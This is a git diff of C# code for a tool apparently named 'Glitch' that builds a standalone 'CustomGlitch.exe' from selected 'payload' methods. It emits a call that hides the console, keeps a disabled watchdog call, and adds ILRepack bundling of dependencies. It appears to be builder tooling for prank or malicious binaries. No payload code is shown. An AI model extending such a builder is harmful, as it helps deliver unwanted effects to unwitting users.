@@ -1,10 +1,12 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Reflection;
 using System.Reflection.Emit;
 using System.Threading;
 using GlitchPayloads;
+using ILRepacking;
 using Misc;
 
 namespace Glitch
@@ -28,7 +30,8 @@ namespace Glitch
             Console.WriteLine("Using payloads:");
             List<Tuple<MethodInfo, int, int>> mpayloads = new List<Tuple<MethodInfo, int, int>>();
             List<Tuple<MethodInfo, int>> mpayloads2 = new List<Tuple<MethodInfo, int>>();
-            Program.payloads.Where(s => payloads.Any(a => string.Equals(s.Item1.Name.Remove(0, 7), a, StringComparison.CurrentCultureIgnoreCase))).ToList()
+            Program.payloads.Where(s => payloads.Any(a =>
+                    string.Equals(s.Item1.Name.Remove(0, 7), a, StringComparison.CurrentCultureIgnoreCase))).ToList()
                 .ForEach(
                     s =>
                     {
@@ -36,7 +39,8 @@ namespace Glitch
                         mpayloads.Add(new Tuple<MethodInfo, int, int>(s.Item1, s.Item2.RunAfter, s.Item2.DefaultDelay));
                     });
             Console.WriteLine($"{Environment.NewLine}Self-Hosted:{Environment.NewLine}");
-            Program.selfHostedPayloads.Where(s => payloads.Any(a => String.Equals(s.Item1.Name.Remove(0, 7), a, StringComparison.CurrentCultureIgnoreCase))).ToList()
+            Program.selfHostedPayloads.Where(s => payloads.Any(a =>
+                    string.Equals(s.Item1.Name.Remove(0, 7), a, StringComparison.CurrentCultureIgnoreCase))).ToList()
                 .ForEach(
                     s =>
                     {
@@ -45,7 +49,7 @@ namespace Glitch
                     });
             Console.WriteLine("Your binary will be saved as \"CustomGlitch.exe\"");
             AssemblyName aName = new AssemblyName("CustomGlitch");
-            AssemblyBuilder ab = AppDomain.CurrentDomain.DefineDynamicAssembly(aName, AssemblyBuilderAccess.Save);
+            AssemblyBuilder ab = AssemblyBuilder.DefineDynamicAssembly(aName, AssemblyBuilderAccess.Save);
             ModuleBuilder mb = ab.DefineDynamicModule(aName.Name, aName.Name + ".exe");
             TypeBuilder tb = mb.DefineType("Program", TypeAttributes.Public);
             MethodBuilder entry =
@@ -89,14 +93,39 @@ namespace Glitch
                 il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("HideCmd"), null);
                 il.Emit(OpCodes.Nop);
             }
+            /* TODO fix WDs (Check if should run as WD, might require some extra work for the entry point)
             if (runWds)
             {
                 il.EmitCall(OpCodes.Call, typeof(StandardCommands).GetMethod("RunWDs"), null);
                 il.Emit(OpCodes.Nop);
-            }
+            }*/
             il.Emit(OpCodes.Ret);
             tb.CreateType();
             ab.Save(aName.Name + ".exe");
+            Assembly asm = Assembly.Load(File.ReadAllBytes("CustomGlitch.exe"));
+            ILRepack repack = new ILRepack(new RepackOptions(new[]{"/out:CustomGlitch.merged.exe", "CustomGlitch.exe"}.Concat(GetDependentFilesPass(asm, Environment.CurrentDirectory))));
+            repack.Repack();
+            File.Delete("CustomGlitch.exe");
+            File.Move("CustomGlitch.merged.exe", "CustomGlitch.exe");
+        }
+        
+        private static string[] GetDependentFilesPass(Assembly assembly, string poe)
+        {
+            return CollectDeps(assembly, poe).Select(s => Path.GetFullPath($"{s.Name}.dll")).Where(File.Exists)
+                .ToArray();
+        }
+
+        private static AssemblyName[] CollectDeps(Assembly assembly, string poe)
+        {
+            List<AssemblyName> tmp = assembly.GetReferencedAssemblies().ToList();
+            int i = 0;
+            while (i < tmp.Count())
+            {
+                Assembly tmp1 = Assembly.Load(tmp[i]);
+                tmp.AddRange(tmp1.GetReferencedAssemblies().Where(s => Path.GetFullPath(s.Name).StartsWith(poe) && !tmp.Any(a => a.Name == s.Name)));
+                i++;
+            }
+            return tmp.ToArray();
         }
 
         public static void ILTest() // used for finding IL code using the IDE-integrated IL-Viewer
